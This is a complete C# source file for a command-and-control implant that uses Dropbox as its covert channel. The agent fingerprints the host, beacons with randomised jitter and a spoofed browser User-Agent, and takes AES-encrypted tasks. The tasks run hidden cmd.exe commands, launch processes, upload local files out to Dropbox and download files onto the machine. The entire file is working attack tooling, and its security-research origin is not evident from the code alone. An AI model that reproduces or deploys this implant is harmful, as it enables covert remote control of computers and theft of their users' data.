/*
Author: Arno0x0x, Twitter: @Arno0x0x

x64 platform
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:c2_agent.exe c2_agent.cs

 x86 platform
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:c2_agent.exe c2_agent.cs
*/

// Comment out the following line to disable DEBUG information for production release
#define DEBUG 

using System;
using System.Net;
using System.Text;
using System.IO;
using System.Collections;
using System.Management;
using System.Web.Script.Serialization;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Threading;

namespace dropboxc2
{
    //****************************************************************************************
    // Static class holding global constants and variables
    //****************************************************************************************
    static class Globals
    {
        
    }

    //****************************************************************************************
    // Main program
    //****************************************************************************************
    class C2_Agent
    {
        int pollingPeriod = 10000; // Nominal polling period in milliseconds
        int deviation = 50; // Deviation is a percentage of variation around the polling period
        int sleepTime = 0; // Actual sleeping period: a random result based on the pollingPeriod and the deviation
        string agentID = String.Empty;
        string c2StatusFile = String.Empty; // The status file that will be used to notify about the agent status
        string c2StatusFileLastRevNumber = String.Empty; // The last revision number for the status file
        string c2CmdFile = String.Empty; // The Command file that will be used to receive commands
        string c2CmdFileLastRevNumber = String.Empty; // The last revision number for the command file

        //--------------------------------------------------------------------------------------------------
        // Main program function
        //--------------------------------------------------------------------------------------------------
        static void Main(string[] args)
        {
            #if (DEBUG)
                Console.WriteLine("------------ AGENT STARTING ------------");
#endif

            string accessToken = args[0];
            byte[] cryptoKey = Convert.FromBase64String(args[1]);

            // Create an instance of the C2_Agent
            C2_Agent c2_agent = new C2_Agent();

            // Break flag used to exit the agent
            bool breakFlag = false;

            // Get a unique ID for the machine this agent is running on
            c2_agent.agentID = c2_agent.createAgentID();
            c2_agent.c2StatusFile = "/" + c2_agent.agentID + ".status";
            c2_agent.c2CmdFile = "/" + c2_agent.agentID + ".cmd";

            // Initializing a DropboxHandler object to handle all communications with the Dropbox C2 server
            DropboxHandler dropboxHandler = new DropboxHandler(accessToken);

            #if (DEBUG)
                    Console.WriteLine("[Main] Uploading status and command file to the C2 server");
            #endif

            // Create the c2StatusFile and c2CmdFile on the Dropbox server. These files act as an unique identifier for this agent
            // as well as a receiver for commands from the server
            c2_agent.c2CmdFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2CmdFile, Encoding.ASCII.GetBytes(""));
            c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes(""));

            if (c2_agent.c2StatusFileLastRevNumber == String.Empty || c2_agent.c2CmdFileLastRevNumber == String.Empty)
            {
                #if (DEBUG)
                    Console.WriteLine("[Main][ERROR] Cannot create files on the C2 server");
                #endif

                breakFlag = true;
            }
            else {
                #if (DEBUG)
                    Console.WriteLine("[Main] C2 Files created - Agent ready");
                #endif
            }

            //---------------------------------------------------------------------------------
            // Main loop
            //---------------------------------------------------------------------------------
            while (!breakFlag)
            {
                // Reset sleep time to the nominal polling period with a deviation
                c2_agent.sleepTime = c2_agent.getRandomPeriod();

                #if (DEBUG)
                    Console.WriteLine("[Main loop] Going to sleep for " + c2_agent.sleepTime/1000 + " seconds");
                #endif

                // Wait for the polling period to time out
                Thread.Sleep(c2_agent.sleepTime);
                #if (DEBUG)
                    Console.WriteLine("[Main loop] Waking up");
                #endif

                // At each cycle, 'touch' the status file to show the agent is alive = beaconing
                c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes("READY - " + DateTime.Now.ToString()));
   
                // Check the c2 command File revision number
                string revNumber = dropboxHandler.getRevNumber(c2_agent.c2CmdFile);
                if (revNumber == String.Empty)
                {
                    #if (DEBUG)
                        Console.WriteLine("[Main loop][ERROR] Unable to get the revision number for the command file");
                    #endif
                    // There was an error retrieving the last revision number, skip this turn
                    continue;
                }

                // If the revision number is different, that means there's a new command to be treated
                if (revNumber != c2_agent.c2CmdFileLastRevNumber)
                {
                    #if (DEBUG)
                        Console.WriteLine("[Main loop] Command file has a new revision number: [" + revNumber + "]");
                    #endif

                    c2_agent.c2CmdFileLastRevNumber = revNumber;

                    // Read the content of the C2 file
                    string content = Encoding.ASCII.GetString(Crypto.DecryptData(dropboxHandler.readFile(c2_agent.c2CmdFile), cryptoKey));
                    if (content == String.Empty)
                    {
                        #if (DEBUG)
                            Console.WriteLine("[Main loop][ERROR] C2 command file on the server seems empty...");
                        #endif
                        continue;
                    }

                    //---------------------------------------------------------------------------------------------------
                    // Parse the received command to extract all required fields
                    StringReader strReader = new StringReader(content);
                    string result = String.Empty;
                    string command = strReader.ReadLine();
                    string taskID = strReader.ReadLine();
                    string taskResultFile = "/" + c2_agent.agentID + "." + taskID;

                    #if (DEBUG)
                        Console.WriteLine("[Main loop] Command to execute: [" + command +"]");
                    #endif

                    switch (command)
                    {
                        case "runCLI":
                            string commandLine = strReader.ReadLine();
                    
                            #if (DEBUG)
                                Console.WriteLine("\t[runCLI] Executing: [" + commandLine +"]");
                            #endif


                            // Execute the command
                            result = c2_agent.runCMD(commandLine);

                            if (result == null)
                            {
                                result = "ERROR - COULD NOT EXECUTE COMMAND:" + commandLine;
                                #if (DEBUG)
                                    Console.WriteLine("\t[runCLI][ERROR] External command did not executed properly");
                                #endif
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.UTF8.GetBytes(result), cryptoKey));
                        break;

                        case "launchProcess":
                            string exeName = strReader.ReadLine();
                            string arguments = strReader.ReadLine();

                            #if (DEBUG)
                                Console.WriteLine("\t[launchProcess] Executing: [" + exeName + " " + arguments + "]");
                            #endif

                            // Execute the command
                            if (c2_agent.launchProcess(exeName, arguments))
                            {
                                result = "OK - PROCESS STARTED: " + exeName + arguments;
                            } else
                            {
                                result = "ERROR - COULD NOT EXECUTE: " + exeName + " " + arguments;
                                #if (DEBUG)
                                    Console.WriteLine("\t[launchProcess][ERROR] External command did not executed properly");
                                #endif
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "sendFile":
                            string localFile = strReader.ReadLine();
                            string remoteFile = taskResultFile + ".rsc";

                            #if (DEBUG)
                                Console.WriteLine("\t[sendFile] Uploading file [" + localFile + "] to [" + remoteFile + "]");
                            #endif

                            if (File.Exists(localFile))
                            {
                                // First push the wanted local file to the C2 server
                                dropboxHandler.putFile(remoteFile, Crypto.EncryptData(File.ReadAllBytes(localFile), cryptoKey));

                                #if (DEBUG)
                                    Console.WriteLine("\t[sendFile] File uploaded");
                                #endif

                                // The task result is the path to the uploaded resource file
                                result = remoteFile;
                                    
                            } else
                            {
                                // Push the command result to the C2 server
                                result = "ERROR - FILE NOT FOUND: " + localFile;
                                #if (DEBUG)
                                    Console.WriteLine("\t[sendFile][ERROR] Command did not executed properly. Localfile not found : [" + localFile + "]");
                                #endif
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "downloadFile":
                            remoteFile = strReader.ReadLine();
                            string localPath = strReader.ReadLine();
                            string fileName = strReader.ReadLine();

                            if (localPath == "temp")
                            {
                                localPath = Path.GetTempPath();
                            }

                            #if (DEBUG)
                                Console.WriteLine("\t[downloadFile] Downloading file from [" + remoteFile + "] to [" + localPath + fileName + "]");
                            #endif

                            if (dropboxHandler.downloadFile(remoteFile, localPath + fileName))
                            {
                                #if (DEBUG)
                                    Console.WriteLine("\t[downloadFile] File downloaded");
                                #endif
                                result = "OK - FILE DOWNLOADED AT: " + localPath + fileName;
                            } else
                            {
                                #if (DEBUG)
                                    Console.WriteLine("\t[downloadFile][ERROR] Could not download file");
                                #endif
                                result = "ERROR - COULD NOT WRITE FILE AT LOCATION: " + localPath + fileName;
                            }

                            // remote file must be deleted
                            dropboxHandler.deleteFile(remoteFile);

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "sleep":
                            int sleepTime;
                            string value = strReader.ReadLine();
                            if (Int32.TryParse(value, out sleepTime))
                            {
                                c2_agent.sleepTime = sleepTime * 60*1000;

                                #if (DEBUG)
                                    Console.WriteLine("\t[sleep] Going to sleep for " + sleepTime + " minute(s)");
                                #endif

                                // Compute wake up time
                                DateTime wakeUpTime = DateTime.Now.AddMinutes(sleepTime);
                                result = "SLEEPING" + "," + wakeUpTime.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ");

                                c2_agent.c2StatusFileLastRevNumber = dropboxHandler.putFile(c2_agent.c2StatusFile, Encoding.ASCII.GetBytes(result));
                            } else
                            {
                                #if (DEBUG)
                                    Console.WriteLine("\t[sleep][ERROR] Invalid amount of time specified [" + value + "]");
                                #endif
                                result = "ERROR - INVALID AMOUNT OF TIME FOR SLEEP: " + value;
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "polling":
                            int period, deviation;
                            string value1 = strReader.ReadLine();
                            string value2 = strReader.ReadLine();
                            if (Int32.TryParse(value1, out period) && Int32.TryParse(value2, out deviation))
                            {
                                c2_agent.pollingPeriod = period*1000;
                                c2_agent.deviation = deviation;

                                #if (DEBUG)
                                    Console.WriteLine("\t[polling] Polling period changed to {0}s with a deviation of {1}% ", period, deviation);
                                #endif

                                result = "OK - PERIOD AND DEVIATION CHANGED";
                            }
                            else
                            {
                                #if (DEBUG)
                                    Console.WriteLine("\t[polling][ERROR] Invalid value for period or deviation [{0}] / [{1}] of {1}% ", value1, value2);
                                #endif
                                result = "ERROR - INVALID INTEGER VALUE FOR PERIOD AND/OR DEVIATION: " + value1 + value2;
                            }

                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            break;

                        case "stop":
                            #if (DEBUG)
                                    Console.WriteLine("\t[stop] Stopping agent");
                                #endif

                            result = "OK - STOPPING";
                            // Push the command result to the C2 server
                            dropboxHandler.putFile(taskResultFile, Crypto.EncryptData(Encoding.ASCII.GetBytes(result), cryptoKey));
                            
                             breakFlag = true;
                            break;
                    }

                    
                } else
                {
                    #if (DEBUG)
                        Console.WriteLine("[Main loop] revNumber [" + revNumber + "] hasn't changed, nothing to treat");
                    #endif
                }
            }
            #if (DEBUG)
                Console.WriteLine("[Main] Exiting... ");
            #endif
        }

        //--------------------------------------------------------------------------------------------------
        // This method returns a random pollingPeriod using an average value and a deviation around that value
        //--------------------------------------------------------------------------------------------------
        private int getRandomPeriod()
        {
            Random random = new Random((int)DateTime.Now.Ticks);
            return random.Next(pollingPeriod - pollingPeriod*deviation/100, pollingPeriod + pollingPeriod*deviation/100); // Current sleep time, if agent is sleeping, this value increases
        }

        //--------------------------------------------------------------------------------------------------
        // This method runs an external command line on the sytem, using the windows interpreter (cmd.exe).
        // It returns the command result (output or error)
        //--------------------------------------------------------------------------------------------------
        private string runCMD (string command)
        {
            string result = null;

            try
            {
                // create the ProcessStartInfo using "cmd" as the program to be run and "/c " as the parameters.
                // Incidentally, /c tells cmd that we want it to execute the command that follows and then exit.
                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
                
                // Redirect both the standard output and the standard error stream
                // This means that it will be redirected to the Process.StandardOutput StreamReader.
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.RedirectStandardError = true;
                procStartInfo.UseShellExecute = false;
                
                // Run silently, do not create a console window
                procStartInfo.CreateNoWindow = true;
                
                // Create a process, assign its ProcessStartInfo and start it
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();

                // Get the output into a string
                result = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();

                // If there was an error, read the standard error stream
                if (proc.ExitCode != 0) result += proc.StandardError.ReadToEnd();
                
                // Return the command output
                return result;
            }
            catch (Exception ex)
            {
                // Log the exception
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return result;
            }
        }

        //--------------------------------------------------------------------------------------------------
        // This method runs an external executable.
        // It returns true if the process was launched, false otherwise
        //--------------------------------------------------------------------------------------------------
        private bool launchProcess(string exeName, string args)
        {
            try
            {
                // create the ProcessStartInfo using "cmd" as the program to be run and "/c " as the parameters.
                // Incidentally, /c tells cmd that we want it to execute the command that follows and then exit.
                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(exeName, args);

                // Redirect both the standard output and the standard error stream
                // This means that it will be redirected to the Process.StandardOutput StreamReader.
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.RedirectStandardError = true;
                procStartInfo.UseShellExecute = false;

                // Run silently, do not create a console window
                procStartInfo.CreateNoWindow = true;

                // Create a process, assign its ProcessStartInfo and start it
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();

                return true;             
            }
            catch (Exception ex)
            {
                // Log the exception
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return false;
            }
        }

        //--------------------------------------------------------------------------------------------------
        // createAgentID method
        // This method returns a unique ID for the machine it's running on.
        // Ideally, the ID has to be unique worldwide as multiple agents may run on various machine and refer to the same C2 server
        //--------------------------------------------------------------------------------------------------
        private string createAgentID()
        {
            string uniqueID = string.Empty;

            //-------------------------------------------------------------
            // First, get the CPU ID. Only the first CPU ID gets retrieved
            string cpuID = string.Empty;
            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();

            foreach (ManagementObject mo in moc)
            {
                if (cpuID == "")
                {                
                    cpuID = mo.Properties["processorID"].Value.ToString();
                }
            }

            //-------------------------------------------------------------
            // Second, get the MAC address from the first NIC interface found
            string sMacAddress = string.Empty;
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)// only return MAC Address from first card  
                {
                    //IPInterfaceProperties properties = adapter.GetIPProperties(); Line is not required
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }

            //-------------------------------------------------------------
            // Eventually, compute a MD5 hash of both cpuID and sMacAddress
            byte[] tmpSource, tmpHash;
            tmpSource = Encoding.Unicode.GetBytes(cpuID + sMacAddress);
            tmpHash = new MD5CryptoServiceProvider().ComputeHash(tmpSource);
            uniqueID = BitConverter.ToString(tmpHash).Replace("-", string.Empty).ToLower();

            return uniqueID;
        }
    }

    //****************************************************************************************
    // Class handling all communications with the Dropbox server
    //****************************************************************************************
    class DropboxHandler
    {
        WebClient webClient; // WebClient object to communicate with the C2 server
        string accessToken; // Dropbox API access token
        string authorizationHeader;

        // List of Dropbox API URL entry points
        static Hashtable dropboxAPI = new Hashtable() {
            {"listFolder", "https://api.dropboxapi.com/2/files/list_folder" },
            {"move","https://api.dropboxapi.com/2/files/move" },
            {"uploadFile", "https://content.dropboxapi.com/2/files/upload" },
            {"downloadFile", "https://content.dropboxapi.com/2/files/download" },
            {"deleteFile", "https://api.dropboxapi.com/2/files/delete" },
            {"getMetaData", "https://api.dropboxapi.com/2/files/get_metadata" }
        };

        //--------------------------------------------------------------------------------------------------
        // Constructor method
        //--------------------------------------------------------------------------------------------------
        public DropboxHandler (string token)
        {
            accessToken = token;
            authorizationHeader = "Bearer " + accessToken;

            // Create a WebClient object to communicate with the C2 server
            webClient = new WebClient();

            //------------------------------------------------------------------
            // Check if an HTTP proxy is configured on the system, if so, use it
            
            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
            if (defaultProxy != null)
            {
                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Proxy = defaultProxy;
            }
            
            // Set the Authorization header used for all API requests
            webClient.Headers.Add("Authorization", authorizationHeader);
			
			// Set the User-Agent header used for all API requests
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");
        }

        //--------------------------------------------------------------------------------------------------
        // Creates a file on the C2 server at the given path, containing the given bytes.
        // Returns the revision number for the file created.
        //--------------------------------------------------------------------------------------------------
        public string putFile (string path, byte[] data)
        {
            #if (DEBUG)
                Console.WriteLine("\t\t[DropboxHandler.putFile] Uploading file...");
            #endif

            string command = @"{""path"": """ + path + @""",""mode"": ""overwrite"",""autorename"": false,""mute"": true}";
            string revNumber = String.Empty;

            webClient.Headers["Content-Type"] = "application/octet-stream";
            webClient.Headers["Dropbox-API-Arg"] = command;

            try
            {
                byte[] responseArray = webClient.UploadData((string)dropboxAPI["uploadFile"], data);

                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic item = serializer.Deserialize<object>(Encoding.ASCII.GetString(responseArray));
                revNumber = item["rev"];
            }
            catch (Exception ex)
            {
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return revNumber;
            }

            #if (DEBUG)
                Console.WriteLine("\t\t[DropboxHandler.putFile] File upload DONE");
            #endif
            return revNumber;
        }

        //--------------------------------------------------------------------------------------------------
        // Returns the revision number of a file given in argument
        //--------------------------------------------------------------------------------------------------
        public string getRevNumber(string path)
        {
            string command = @"{""path"": """ + path + @""",""include_media_info"": false,""include_deleted"": false,""include_has_explicit_shared_members"": false}";
            string revNumber = String.Empty;

            webClient.Headers.Remove("Dropbox-API-Arg");
            webClient.Headers["Content-Type"] = "application/json";

            byte[] data = Encoding.ASCII.GetBytes(command);

            try
            {
                byte[] responseArray = webClient.UploadData((string)dropboxAPI["getMetaData"], data);

                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic item = serializer.Deserialize<object>(Encoding.ASCII.GetString(responseArray));
                revNumber = item["rev"];
                return revNumber;
            }
            catch (Exception ex)
                {
                    #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return revNumber;
            }
        }

        //--------------------------------------------------------------------------------------------------
        // Returns true if no error occured, false otherwise
        //--------------------------------------------------------------------------------------------------
        public bool deleteFile(string path)
        {
            string command = @"{""path"": """ + path + @"""}";
            string revNumber = String.Empty;

            webClient.Headers.Remove("Dropbox-API-Arg");
            webClient.Headers["Content-Type"] = "application/json";

            byte[] data = Encoding.ASCII.GetBytes(command);

            try
            {
                webClient.UploadData((string)dropboxAPI["deleteFile"], data);
                return true;
            }
            catch (Exception ex)
            {
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return false;
            }
        }

        //--------------------------------------------------------------------------------------------------
        // Reads a remote file and return its content as a byte array
        //--------------------------------------------------------------------------------------------------
        public byte[] readFile(string path)
        {
            string command = @"{""path"": """ + path + @"""}";
            byte[] response = null;

            webClient.Headers.Remove("Content-Type");
            webClient.Headers["Dropbox-API-Arg"] = command;

            try
            {
                response = webClient.DownloadData((string)dropboxAPI["downloadFile"]);
                return response;
            }
            catch (Exception ex)
            {
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return response;
            }
        }

        //--------------------------------------------------------------------------------------------------
        // Downloads a remoteFile to a local one
        // Returns true if all went OK, false otherwise
        //--------------------------------------------------------------------------------------------------
        public bool downloadFile(string remoteFile, string localFile)
        {
            string command = @"{""path"": """ + remoteFile + @"""}";

            webClient.Headers.Remove("Content-Type");
            webClient.Headers["Dropbox-API-Arg"] = command;

            #if (DEBUG)
                Console.WriteLine("\t\t[DropboxHandler.downloadFile] Downloading file...");
            #endif

            try
            {
                webClient.DownloadFile((string)dropboxAPI["downloadFile"], localFile);
                #if (DEBUG)
                    Console.WriteLine("\t\t[DropboxHandler.downloadFile] File downloaded");
                #endif
                return true;
            }
            catch (Exception ex)
            {
                #if (DEBUG)
                    while (ex != null)
                    {
                        Console.WriteLine("[ERROR] " + ex.Message);                            
                        ex = ex.InnerException;
                    }
                #endif
                return false;
            }
        }
    }

    //****************************************************************************************
    // Class handling AES-128 CBC with PCKS7 padding cryptographic operations
    //****************************************************************************************
    static class Crypto
    {
        public static T[] SubArray<T>(this T[] data, int index, int length)
        {
            T[] result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        //--------------------------------------------------------------------------------------------------
        // Encrypts the given plaintext message byte array with a given 128 bits key
        // Returns the encrypted message as follow:
        // :==============:==================================================:
        // : IV(16bytes)  :   Encrypted(data + PKCS7 padding information)    :
        // :==============:==================================================:
        //--------------------------------------------------------------------------------------------------
        static public byte[] EncryptData(byte[] plainMessage, byte[] key)
        {
            #if (DEBUG)
                Console.WriteLine("\t\t[Crypto.EncryptData] Encrypting data...");
            #endif

            // Generate a random IV of 16 bytes
            RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider();
            byte[] IV = new byte[16];
            rngCsp.GetBytes(IV);
            //byte[] cipher = null;

            // Create an AesManaged object with the specified key and IV.
            using (AesManaged aes = new AesManaged())
            {
                aes.Padding = PaddingMode.PKCS7;
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = IV;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(IV, 0, 16);
                        cs.Write(plainMessage, 0, plainMessage.Length);
                    }

                    #if (DEBUG)
                        Console.WriteLine("\t\t[Crypto.EncryptData] Data encrypted");
                    #endif
                    return ms.ToArray();
                }
            }
        }

        //--------------------------------------------------------------------------------------------------
        // Decrypts the given a plaintext message byte array with a given 128 bits key
        // Returns the unencrypted message
        //--------------------------------------------------------------------------------------------------
        static public byte[] DecryptData(byte[] cipher, byte[] key)
        {
            #if (DEBUG)
                Console.WriteLine("\t\t[Crypto.DecryptData] Decrypting data...");
            #endif

            var IV = cipher.SubArray(0, 16);
            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);

            // Create an AesManaged object with the specified key and IV.
            using (AesManaged aes = new AesManaged())
            {
                aes.Padding = PaddingMode.PKCS7;
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = IV;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);
                    }

                    #if (DEBUG)
                          Console.WriteLine("\t\t[Crypto.DecryptData] Data decrypted");
                    #endif

                    return ms.ToArray();
                }
            }
        }
    }
}
